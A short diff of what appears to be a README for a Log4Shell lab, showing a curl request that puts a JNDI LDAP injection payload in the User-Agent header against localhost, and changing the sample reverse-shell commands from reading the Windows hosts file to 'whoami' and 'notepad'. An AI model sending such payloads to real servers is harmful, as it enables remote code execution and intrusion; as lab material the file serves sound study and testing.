@@ -40,7 +40,8 @@ curl http://localhost:8080/ -H 'User-Agent:${jndi:ldap://0.0.0.0:636/a}'
 
 ## Sample command in reverse shell
 ```
-cmd /C more c:\windows\system32\drivers\etc\hosts
+cmd /C whoami
+notepad
 ```
 
 
